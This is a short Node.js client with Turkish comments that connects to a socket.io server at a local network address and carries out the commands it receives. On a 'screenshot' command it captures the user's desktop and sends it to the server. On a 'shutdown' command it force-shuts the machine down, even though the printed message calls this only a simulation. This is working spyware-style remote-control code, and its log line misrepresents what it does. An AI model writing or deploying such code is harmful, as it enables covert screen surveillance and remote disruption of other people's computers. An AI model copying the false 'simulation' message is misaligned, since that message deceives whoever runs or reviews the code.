const io = require('socket.io-client');
const screenshot = require('screenshot-desktop');
const { exec } = require('child_process');

const socket = io('http://192.168.1.153:3000'); // Sunucu adresi

socket.on('connect', () => {
    console.log('Sunucuya bağlandı.');
});

socket.on('komut', async (komut) => {
    console.log(`Gelen komut: ${komut}`);

    if (komut === 'screenshot') {
        try {
            const img = await screenshot({ format: 'png' });
            socket.emit('screenshot-data', img.toString('base64'));
            console.log('Ekran görüntüsü gönderildi.');
        } catch (err) {
            console.error('Ekran görüntüsü alınamadı:', err);
        }
    }

    if (komut === 'shutdown') {
        console.log("Sistem kapatılıyor (gerçekten değil, simülasyon)");
         exec('shutdown -s -t 0');
    }
});

